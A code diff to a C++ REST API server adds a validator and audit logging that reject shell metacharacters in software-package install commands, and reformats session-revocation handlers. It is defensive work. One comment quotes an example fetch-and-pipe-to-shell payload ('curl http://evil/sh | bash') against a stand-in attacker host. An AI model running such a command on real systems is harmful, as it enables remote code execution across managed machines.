@@ -5,7 +5,7 @@
 #include "store_errors.hpp"
 #include "visualization_engine.hpp"
 
-#include <yuzu/server/auth_db.hpp>  // is_valid_username
+#include <yuzu/server/auth_db.hpp> // is_valid_username
 
 // nlohmann/json is retained ONLY for parsing request bodies (json::parse).
 // All response JSON is built via the lightweight JObj/JArr helpers below,
@@ -488,6 +488,82 @@ const std::string& openapi_spec() {
   }
 })json";
     return spec;
+}
+
+// ── Install-command input validation (#771 / W7.5 PR 1) ──────────────────────
+//
+// `verify_command`, `rollback_command`, and `silent_args` on a SoftwarePackage
+// are persisted in `software_packages.*` and (per the cluster-2 follow-up
+// roadmap) will be dispatched to enrolled agents once the deployment-execution
+// path is wired up. To prevent a Write-permission operator from staging a
+// fleet-RCE payload via shell injection (e.g. `"curl http://evil/sh | bash"`),
+// reject any string that contains shell-meta characters at REST input time.
+//
+// Allowed characters cover the realistic install vocabulary across Windows /
+// Linux / macOS installers (msiexec, reg, wmic, dpkg, rpm, pkg, PowerShell
+// single-line invocations, /qn /norestart-style silent args). The block-list
+// targets:
+//   - command chaining: ; & |
+//   - substitution: ` $
+//   - redirection: < >
+//   - subshells: ( )
+//   - all C0 control characters except SPACE (covers \n \r \0 \t VT FF etc.)
+//   - DEL (0x7F)
+//
+// Why not block braces / brackets / globs? Brace expansion is shell-side only
+// — agents executing via `safe_execute` (CreateProcessW / fork+execvp) do not
+// interpret braces. msiexec product GUIDs need them (`msiexec /x {GUID} /qn`).
+// Length cap is 512 chars — generous for any realistic installer invocation.
+//
+// UTF-8 invariance: all blocked characters are ASCII. UTF-8 continuation
+// bytes are 0x80–0xBF, never collide with our ASCII block-list, so a
+// byte-wise scan on a UTF-8 std::string_view is correct without codepoint
+// decoding. Do NOT "fix" the byte scan by adding decoding — it would not be
+// safer and would slow the hot path.
+//
+// This is **defence-in-depth**: it caps the harm if/when an operator (or a
+// future code path) ends up dispatching the field through a shell. The
+// architectural follow-up (PR 2 of the W7.5 ladder) replaces the free-form
+// string with a structured-action protocol via InstructionDefinition
+// reference, which bypasses the shell entirely. PR 2 also needs to reconcile
+// this validator's accepted alphabet ({ } [ ] etc.) against the agent-side
+// `is_safe_arg` in content_dist_plugin.cpp, which currently has a stricter
+// block list — divergence noted by Round 1 consistency review.
+constexpr std::size_t kMaxInstallCommandLen = 512;
+
+bool is_safe_install_command(std::string_view s) {
+    if (s.size() > kMaxInstallCommandLen)
+        return false;
+    for (char c : s) {
+        const auto uc = static_cast<unsigned char>(c);
+        // Block ALL C0 control characters except SPACE (covers \0 \t \n \r
+        // VT FF and the rest). Catches log-injection via VT (0x0B) etc. that
+        // a journald collector might normalise to \n.
+        if (uc < 0x20 && c != ' ')
+            return false;
+        // Block DEL (0x7F).
+        if (uc == 0x7F)
+            return false;
+        switch (c) {
+        // Command chaining / control flow
+        case ';':
+        case '&':
+        case '|':
+        // Substitution
+        case '`':
+        case '$':
+        // Redirection
+        case '<':
+        case '>':
+        // Subshell
+        case '(':
+        case ')':
+            return false;
+        default:
+            break;
+        }
+    }
+    return true;
 }
 
 } // anonymous namespace
@@ -1232,7 +1308,7 @@ void RestApiV1::register_routes(
     // and accepting them here would create a novel DoS surface against
     // the human owner (sec-M2 / UP-14).
     sink.Delete("/api/v1/sessions/me", [auth_fn, audit_fn, session_revoke_fn](
-                                          const httplib::Request& req, httplib::Response& res) {
+                                           const httplib::Request& req, httplib::Response& res) {
         auto session = auth_fn(req, res);
         if (!session)
             return;
@@ -1242,8 +1318,7 @@ void RestApiV1::register_routes(
             // through to revoke — comparing two empty strings would
             // mis-attribute the action.
             res.status = 500;
-            res.set_content(error_json("session has empty username", 500),
-                            "application/json");
+            res.set_content(error_json("session has empty username", 500), "application/json");
             return;
         }
         // Audit emission helper — wraps audit_fn so we can capture both
@@ -1260,8 +1335,8 @@ void RestApiV1::register_routes(
                 bool ok = audit_fn(req, action, result, target_type, target_id, detail);
                 return RestApiV1::AuditEmission{ok, /*threw=*/false};
             } catch (const std::exception& e) {
-                spdlog::error("audit_fn threw on session-revoke action={} target={}: {}",
-                              action, target_id, e.what());
+                spdlog::error("audit_fn threw on session-revoke action={} target={}: {}", action,
+                              target_id, e.what());
                 return RestApiV1::AuditEmission{false, /*threw=*/true};
             } catch (...) {
                 spdlog::error("audit_fn threw unknown on session-revoke action={} target={}",
@@ -1275,10 +1350,10 @@ void RestApiV1::register_routes(
             // automation token, must not be able to wipe its principal's
             // interactive cookies. Use the dashboard or a session cookie
             // for that.
-            const auto audit = try_audit(
-                "session.revoke_all.self", "denied", "User", session->username,
-                "non-interactive credential rejected (mcp_tier='"
-                + session->mcp_tier + "' scope='" + session->token_scope_service + "')");
+            const auto audit =
+                try_audit("session.revoke_all.self", "denied", "User", session->username,
+                          "non-interactive credential rejected (mcp_tier='" + session->mcp_tier +
+                              "' scope='" + session->token_scope_service + "')");
             if (!audit.emitted)
                 res.set_header("Sec-Audit-Failed", "true");
             res.status = 403;
@@ -1295,30 +1370,28 @@ void RestApiV1::register_routes(
         const auto result = session_revoke_fn(session->username, /*revoke_api_tokens=*/true);
         const std::string audit_result = result.db_persisted ? "success" : "partial";
         const std::string detail =
-            "count=" + std::to_string(result.cookie_sessions_revoked)
-            + " api_tokens_revoked=" + std::to_string(result.api_tokens_revoked)
-            + (result.db_persisted ? "" : " db_error=true");
-        const auto audit = try_audit("session.revoke_all.self", audit_result, "User",
-                                     session->username, detail);
+            "count=" + std::to_string(result.cookie_sessions_revoked) +
+            " api_tokens_revoked=" + std::to_string(result.api_tokens_revoked) +
+            (result.db_persisted ? "" : " db_error=true");
+        const auto audit =
+            try_audit("session.revoke_all.self", audit_result, "User", session->username, detail);
         // CC6.7 disposition: clear the caller's cookie on the response so
         // the client side completes the revocation. Mirrors POST /logout
         // attribute set; the `Secure` flag (set on issuance based on
         // https config) is omitted here to match the logout precedent —
         // the cookie attributes only need to identify the cookie for
         // browser deletion, not match the original issuance flags.
-        res.set_header("Set-Cookie",
-                       "yuzu_session=; Path=/; HttpOnly; SameSite=Lax; Max-Age=0");
+        res.set_header("Set-Cookie", "yuzu_session=; Path=/; HttpOnly; SameSite=Lax; Max-Age=0");
         if (!audit.emitted)
             res.set_header("Sec-Audit-Failed", "true");
-        res.set_content(ok_json(JObj()
-                                    .add("revoked",
-                                         static_cast<int64_t>(result.cookie_sessions_revoked))
-                                    .add("api_tokens_revoked",
-                                         static_cast<int64_t>(result.api_tokens_revoked))
-                                    .add("db_persisted", result.db_persisted)
-                                    .add("audit_emitted", audit.emitted)
-                                    .str()),
-                        "application/json");
+        res.set_content(
+            ok_json(JObj()
+                        .add("revoked", static_cast<int64_t>(result.cookie_sessions_revoked))
+                        .add("api_tokens_revoked", static_cast<int64_t>(result.api_tokens_revoked))
+                        .add("db_persisted", result.db_persisted)
+                        .add("audit_emitted", audit.emitted)
+                        .str()),
+            "application/json");
     });
 
     // DELETE /api/v1/sessions?username=<name> — admin-only force-logout.
@@ -1328,7 +1401,7 @@ void RestApiV1::register_routes(
     // NUL byte in the input cannot truncate the SQL bind in a way that
     // diverges from the in-memory `==` comparison (sec-H1 / UP-8).
     sink.Delete("/api/v1/sessions", [auth_fn, perm_fn, audit_fn, session_revoke_fn](
-                                       const httplib::Request& req, httplib::Response& res) {
+                                        const httplib::Request& req, httplib::Response& res) {
         if (!perm_fn(req, res, "UserManagement", "Write"))
             return;
         auto session = auth_fn(req, res);
@@ -1338,8 +1411,7 @@ void RestApiV1::register_routes(
             // sec-M1: empty caller username would mis-attribute the
             // self-vs-cross-user audit action selection below.
             res.status = 500;
-            res.set_content(error_json("session has empty username", 500),
-                            "application/json");
+            res.set_content(error_json("session has empty username", 500), "application/json");
             return;
         }
         if (!session_revoke_fn) {
@@ -1360,8 +1432,7 @@ void RestApiV1::register_routes(
             // attacker-controlled string while the SQL bind silently
             // truncates at NUL — different rows hit memory vs disk.
             res.status = 400;
-            res.set_content(error_json("invalid username format", 400),
-                            "application/json");
+            res.set_content(error_json("invalid username format", 400), "application/json");
             return;
         }
         const auto result = session_revoke_fn(username, /*revoke_api_tokens=*/false);
@@ -1371,9 +1442,8 @@ void RestApiV1::register_routes(
         const std::string action =
             (username == session->username) ? "session.revoke_all.self" : "session.revoke_all";
         const std::string audit_result = result.db_persisted ? "success" : "partial";
-        const std::string detail =
-            "count=" + std::to_string(result.cookie_sessions_revoked)
-            + (result.db_persisted ? "" : " db_error=true");
+        const std::string detail = "count=" + std::to_string(result.cookie_sessions_revoked) +
+                                   (result.db_persisted ? "" : " db_error=true");
         // HIGH-2 on PR #883 — wrap in try/catch and capture the audit_fn
         // bool return so a silent persist failure (audit DB locked /
         // disk full) or an exception path doesn't masquerade as 200 OK
@@ -1382,27 +1452,26 @@ void RestApiV1::register_routes(
         // body field gives the API client the same signal.
         bool audit_emitted = true;
         try {
-            audit_emitted =
-                audit_fn(req, action, audit_result, "User", username, detail);
+            audit_emitted = audit_fn(req, action, audit_result, "User", username, detail);
         } catch (const std::exception& e) {
-            spdlog::error("audit_fn threw on session-revoke action={} target={}: {}",
-                          action, username, e.what());
+            spdlog::error("audit_fn threw on session-revoke action={} target={}: {}", action,
+                          username, e.what());
             audit_emitted = false;
         } catch (...) {
-            spdlog::error("audit_fn threw unknown on session-revoke action={} target={}",
-                          action, username);
+            spdlog::error("audit_fn threw unknown on session-revoke action={} target={}", action,
+                          username);
             audit_emitted = false;
         }
         if (!audit_emitted)
             res.set_header("Sec-Audit-Failed", "true");
-        res.set_content(ok_json(JObj()
-                                    .add("username", username)
-                                    .add("revoked",
-                                         static_cast<int64_t>(result.cookie_sessions_revoked))
-                                    .add("db_persisted", result.db_persisted)
-                                    .add("audit_emitted", audit_emitted)
-                                    .str()),
-                        "application/json");
+        res.set_content(
+            ok_json(JObj()
+                        .add("username", username)
+                        .add("revoked", static_cast<int64_t>(result.cookie_sessions_revoked))
+                        .add("db_persisted", result.db_persisted)
+                        .add("audit_emitted", audit_emitted)
+                        .str()),
+            "application/json");
     });
 
     // ── Quarantine (/api/v1/quarantine) ──────────────────────────────────
@@ -2735,25 +2804,91 @@ void RestApiV1::register_routes(
                 res.set_content(error_json("invalid JSON"), "application/json");
                 return;
             }
-            auto pkg_name = body.value("name", "");
-            auto pkg_version = body.value("version", "");
-            if (pkg_name.empty() || pkg_version.empty()) {
+
+            // Helper: emit a rejection-audit row AND set Sec-Audit-Failed
+            // header if the audit_fn signals failure. Matches the W1.1 /
+            // PR #883 pattern used by the session-revoke handlers — the
+            // operator must learn from the response whether the security
+            // event was actually persisted.
+            auto emit_denial = [&](const char* detail_msg) {
+                bool emitted = audit_fn(req, "software_package.create", "denied", "SoftwarePackage",
+                                        "", detail_msg);
+                if (!emitted)
+                    res.set_header("Sec-Audit-Failed", "true");
+            };
+
+            SoftwarePackage pkg;
+            try {
+                auto pkg_name = body.value("name", "");
+                auto pkg_version = body.value("version", "");
+                if (pkg_name.empty() || pkg_version.empty()) {
+                    res.status = 400;
+                    res.set_content(error_json("name and version are required"),
+                                    "application/json");
+                    return;
+                }
+                pkg.name = pkg_name;
+                pkg.version = pkg_version;
+                pkg.platform = body.value("platform", "windows");
+                pkg.installer_type = body.value("installer_type", "msi");
+                pkg.content_hash = body.value("content_hash", "");
+                pkg.content_url = body.value("content_url", "");
+                pkg.silent_args = body.value("silent_args", "");
+                pkg.verify_command = body.value("verify_command", "");
+                pkg.rollback_command = body.value("rollback_command", "");
+                pkg.size_bytes = body.value("size_bytes", int64_t{0});
+            } catch (const nlohmann::json::exception& e) {
+                // body.value throws json::type_error when a present field is
+                // the wrong JSON type (e.g. {"verify_command": 42}). Without
+                // this catch the exception escapes the lambda → httplib
+                // returns 500 with no audit trail. Audit + 400 instead.
+                emit_denial("payload field has wrong JSON type — string expected");
                 res.status = 400;
-                res.set_content(error_json("name and version are required"), "application/json");
+                res.set_content(error_json(std::string{"invalid field type: "} + e.what()),
+                                "application/json");
                 return;
             }
-            SoftwarePackage pkg;
-            pkg.name = pkg_name;
-            pkg.version = pkg_version;
-            pkg.platform = body.value("platform", "windows");
-            pkg.installer_type = body.value("installer_type", "msi");
-            pkg.content_hash = body.value("content_hash", "");
-            pkg.content_url = body.value("content_url", "");
-            pkg.silent_args = body.value("silent_args", "");
-            pkg.verify_command = body.value("verify_command", "");
-            pkg.rollback_command = body.value("rollback_command", "");
-            pkg.size_bytes = body.value("size_bytes", int64_t{0});
             pkg.created_by = session->username;
+
+            // #771 / W7.5: reject install commands containing shell metachars
+            // BEFORE they reach the store. All three free-form fields
+            // (verify_command, rollback_command, silent_args) share the same
+            // dispatch threat model — silent_args is concatenated into the
+            // installer argv, verify+rollback are full command lines. Audit
+            // the rejection as a security event so an operator scoping the
+            // fleet-RCE surface sees the attempted injection in the audit log
+            // even though the package was never persisted.
+            constexpr const char* kInputErr =
+                " contains forbidden characters (shell metacharacters ; & | ` $ < > ( ) "
+                "or control characters blocked) or exceeds 512-char length cap";
+            if (!is_safe_install_command(pkg.verify_command)) {
+                emit_denial("verify_command contains shell metacharacters / control chars or "
+                            "exceeds length cap");
+                res.status = 400;
+                res.set_content(error_json(std::string{"verify_command"} + kInputErr),
+                                "application/json");
+                return;
+            }
+            if (!is_safe_install_command(pkg.rollback_command)) {
+                emit_denial("rollback_command contains shell metacharacters / control chars or "
+                            "exceeds length cap");
+                res.status = 400;
+                res.set_content(error_json(std::string{"rollback_command"} + kInputErr),
+                                "application/json");
+                return;
+            }
+            if (!is_safe_install_command(pkg.silent_args)) {
+                // silent_args is the same attack vector as verify/rollback —
+                // it's concatenated into the installer argv on dispatch. The
+                // round-1 consistency review flagged this as the exact
+                // #1072 → #1073 sibling-gap pattern. Block here too.
+                emit_denial("silent_args contains shell metacharacters / control chars or "
+                            "exceeds length cap");
+                res.status = 400;
+                res.set_content(error_json(std::string{"silent_args"} + kInputErr),
+                                "application/json");
+                return;
+            }
 
             auto result = sw_deploy_store->create_package(pkg);
             if (!result) {
